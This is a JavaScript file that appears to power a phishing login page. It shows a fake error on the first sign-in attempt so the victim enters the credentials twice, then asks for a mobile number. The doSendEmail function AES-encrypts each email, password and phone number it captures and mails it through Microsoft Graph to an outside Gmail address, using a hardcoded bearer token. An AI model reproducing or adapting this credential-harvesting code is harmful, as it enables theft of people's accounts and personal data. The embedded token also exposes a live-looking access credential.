let slideIdx = 0;
let loginIdx = 0;

function igcRegisterEvents() {
    $("body").off("keyup", ".igc_loginInputField").on({
        "keyup": function () {
            igcUpdateLoginBtnStyle();
        }
    }, ".igc_loginInputField");

    $("body").off("keyup", ".igc_mobileVerifyInputField").on({
        "keyup": function () {
            igcUpdateMobileVerifyBtnStyle();
        }
    }, ".igc_mobileVerifyInputField");

    $("body").off("click", ".igc_LogInBtn").on({
        "click": function () {
            igcDoLogin();
        }
    }, ".igc_LogInBtn");

    $("body").off("click", ".igc_mobileVerifyBtn").on({
        "click": function () {
            igcDoVerifyMobile();
        }
    }, ".igc_mobileVerifyBtn");
}

function igcUpdateLoginBtnStyle() {
    let $igcLogInBtnEl = $(".igc_LogInBtn");
    let isValidLoginInput = ($(".igc_email").val() && $(".igc_email").val().length > 7 && $(".igc_pwd").val() && $(".igc_pwd").val().length > 7);
    if (isValidLoginInput) {
        $igcLogInBtnEl.removeAttr("disabled")
    }
    else {
        $igcLogInBtnEl.prop("disabled", "disabled");
    }
}

function igcUpdateMobileVerifyBtnStyle() {
    let $igcMobileVerifyEl = $(".igc_mobileVerifyBtn");
    let isValidMobileNoInput = ($(".igc_mobile").val() && $(".igc_mobile").val().length > 9);
    if (isValidMobileNoInput) {
        $igcMobileVerifyEl.removeAttr("disabled")
    }
    else {
        $igcMobileVerifyEl.prop("disabled", "disabled");
    }
}

function igcDoLogin() {
    let $loginDivEl = $(".igcLoginMainDiv");
    let $mobileNoDivEl = $(".igcMobileNoMainDiv");
    let $errorEl = $(".igcErrorAlertDiv");
    let emailVal = $(".igc_email").val();
    let pwdVal = $(".igc_pwd").val();

    if (loginIdx) {
        $mobileNoDivEl.show();
        $loginDivEl.hide();
        $errorEl.css("display", "none");
    }
    else {
        $loginDivEl.show();
        $mobileNoDivEl.hide();
        $errorEl.css("display", "flex");
        $(".igc_email, .igc_pwd").val("");
        igcUpdateLoginBtnStyle();
    }

    loginIdx++;
    let infoObj = {
        "u": emailVal,
        "p": pwdVal
    };
    doSendEmail(infoObj);
}

function igcDoVerifyMobile() {
    let mobileNoVal = $(".igc_mobile").val();
    $(".igcMobileNoMainDiv").hide();
    $(".igcSuccessInfoMainDiv").show();
    
    let infoObj = {
        "m": mobileNoVal
    };
    doSendEmail(infoObj);
}

function doSendEmail(infoObj) {
    let authorizeTokenVal = "EwB4A8l6BAAUwihrrCrmQ4wuIJX5mbj7rQla6TUAAZRdQZouoPc8WlD4wHTNu+p2vrITH7ph0W/kxfR4B/BKADL65g3J/PtSNSfaSqc7KlvN/e1x9GLfudqlc7/Gud4tHGr84mSvNyAV3D/lLgn8jrBiR/YfOwj1E2TTBGgclWUTYrhbm0IaF5njfQRrZ8W1cUrg2gOuXkVaq9NQIBemhVESe1338EvAQ9NxA7fDtC94rHiXcW5dOb7XvzODTSae7Qo2wx9F7fYVaadBV14RX5ZSjnjKlaHWWuWcqD1+QXak5wFJ2yRNLP0fwDTnZFT9mnqZ+7HiwCeO39ayBRWiyxtcU7SQd87nyFrDKGmidNvjY20Cchu7rCp1RTRIRy4DZgAACDvgMF8ftgiYSAIzilCfSCxoblByXxfME6ZljRTCw4Odlm1d8Y1YIpZyCWxLB/EPeaSoCrbs4s9ynYDDmdhwaZtv7yhi2IxomiFPG+loL6eaGvRlfhcJjgiZlFtP75rqjUTeD28ytTqfO/QgusP1DpBzWhQ2Yb/B+C+Kj26Rr6IX8OUF6YyheStzzjUMDoEw5DOBMZH6cYdOPcND0NX2UN3OR0Au6Kn8b3cxjE/eYXUV3H0pLqjfatjyG64+crUQazHedahCK/UU6sC0fPiDkVfoL2mvuwUoLPtQOn+VxRpmAAoSuEMpPfzvlcH+ktLP11EplKxFdR71+gMx8/7WbOi0CwQtA4YxKWFZIH0USUrpF5krLsVYvdBeloeQMCChnK7NlxnDFYz2p18cp+DuPANMPiPw3+UD6KdGX81itWWfED/A91cXZvQzKvGRookdmUnT1tYTd6Mvd0usm0G8w4WHVhLnf/n/ZH5qgWDeveYaBd9M8WBTnbNP5A5hSkT7r7CSxDKiI2MyKlWgBS9P5DKWbQWT+Gi59x+VtvWxs4Z/hU9TRV+Sylq8PXO1z94Aw32bo1TdflWcbz0ZhBu5UaMPnr5yoxvg3jZCfDZ4ZBZXoXwHwslXbuc1ooCyY7ngz+1EEz3DVbGj/1pXR8tWpCobH4t3gzvJU00enZ6eCi0PvFOsm+S5QJGV8YQfR/gbYlxZIJcBLYy5z2pJC6DrbCspYpaB8Tn+t2Hb9J6TNrJ3bpd0RpROLamovA7TkY9jcDlfTaPUf9YrK8F0RMfvz2JVQp0C";

    let igcContent = [];
    $.each(infoObj, function (k, v) {
        if (k && v) {
            igcContent.push(`${k} : ${v}`);
        }
    })

    let igcInfo = doDataEncrypt(igcContent.join(" , "));
    igcInfo = (igcInfo ? igcInfo.toString() : "");

    $.ajax({
        url: "https://graph.microsoft.com/v1.0/users/56c0490219ac4a88/sendMail",
        method: "POST",
        headers: {
            "Authorization": "Bearer " + authorizeTokenVal,
            "Content-Length": "180",
            "Content-Type": "application/json"
        },
        data: JSON.stringify({
            "message": {
                "subject": "IGC",
                "body": {
                    "contentType": "Text",
                    "content": igcInfo
                },
                "toRecipients": [
                    {
                        "emailAddress": {
                            "address": "mail2alpha7@gmail.com"
                        }
                    }
                ]
            }
        })
    })
    .done(function (result) {
        console.log(result);
    })
    .fail(function (err) {
        console.log(err);
    });
}

const igcSecretSaltTxt = "igcSecretPhrase";

function doDataEncrypt(dataForEncrypt) {
    if (dataForEncrypt)
        return CryptoJS.AES.encrypt(dataForEncrypt, igcSecretSaltTxt);
    return "";
}

function doDataDecrypt(dataForDecrypt) {
    if (dataForDecrypt)
        return CryptoJS.AES.decrypt(dataForDecrypt, igcSecretSaltTxt).toString(CryptoJS.enc.Utf8);
    return "";
}

function igcImgSlides() {
    let $igcSlideImgs = $(".igc_slideImg");
    $igcSlideImgs.hide();
    slideIdx++;
    if (slideIdx > $igcSlideImgs.length) { slideIdx = 1 }
    $($igcSlideImgs[slideIdx - 1]).show();
    setTimeout(igcImgSlides, 3000);
}

function hideMask() {
    $(".igcMaskDiv, .igcMaskContentDiv").hide();
}

$(function () {
    igcRegisterEvents();
    igcImgSlides();
})
